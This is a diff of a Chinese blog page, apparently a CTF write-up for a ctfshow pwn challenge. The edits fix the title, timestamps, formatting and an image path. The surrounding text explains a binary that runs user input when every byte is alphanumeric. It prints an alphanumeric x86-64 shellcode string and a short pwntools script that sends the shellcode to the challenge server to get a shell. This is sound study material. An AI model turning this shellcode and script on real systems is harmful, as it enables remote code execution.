@@ -197,7 +197,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2025/01/31/shellcode2/" class="post-title-link" itemprop="url">shellcode2</a>
+            <a href="/2025/01/31/shellcode2/" class="post-title-link" itemprop="url">shellcode（ctfshow65）</a>
         </h2>
 
         <div class="post-meta">
@@ -208,7 +208,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2025-01-31 14:11:58 / 修改时间：16:54:54" itemprop="dateCreated datePublished" datetime="2025-01-31T14:11:58+08:00">2025-01-31</time>
+              <time title="创建时间：2025-01-31 14:11:58 / 修改时间：19:46:03" itemprop="dateCreated datePublished" datetime="2025-01-31T14:11:58+08:00">2025-01-31</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -226,7 +226,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.5k</span>
+              <span>3.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -291,9 +291,9 @@
 <p><strong>循环检查输入内容</strong>：</p>
 <p>在 <code>loc_11B8</code>，程序逐字节检查用户输入的内容：</p>
 <p>如果字节值在 <code>[0x2F, 0x5A]</code> 或 <code>[0x40, 0x5A]</code> 或 <code>[0x60, 0x7A]</code> 范围内，程序继续检查下一个字节。</p>
-<p><strong>[0x2F, 0x5A]：</strong><code>/</code> 到 <code>Z</code>（包括大小写字母和一些符号）</p>
+<p><strong>[0x2F, 0x5A]：</strong><code>/</code>到 <code>Z</code>（包括大小写字母和一些符号）</p>
 <p><strong>[0x40, 0x5A]：</strong><code>@</code> 到 <code>Z</code>（主要是大写字母和一些符号）</p>
-<p>**[0x60, 0x7A]**：&#96;到  z（主要是小写字母和一些符号）</p>
+<p><strong>[0x60, 0x7A]：</strong><code>反引号</code>到  <code>z</code>（主要是小写字母和一些符号）</p>
 <p>如果字节值不在上述范围内，程序打印 <code>&quot;Good,but not right&quot;</code> 并返回。</p>
 <p><strong>执行用户输入</strong>：</p>
 <p>如果所有字节都满足条件，程序会将 <code>buf</code> 的地址加载到寄存器 <code>rax</code> 中，并调用 <code>buf</code>。这意味着程序会尝试执行用户输入的内容</p>
@@ -308,7 +308,7 @@
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode=<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2025/01/31/shellcode2/Users\He\myblog\source_posts\shellcode2\image-20250131165007290.png" alt="image-20250131165007290"></p>
+<p><img src="/2025/01/31/shellcode2/image-20250131165007290.png" alt="image-20250131165007290"></p>
 <h2 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28139</span>)</span><br><span class="line">shellcode=<span class="string">&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span></span><br><span class="line">payload = shellcode </span><br><span class="line">io.send(payload)   <span class="comment">#注意不能用sendline换行符不在区间里</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 
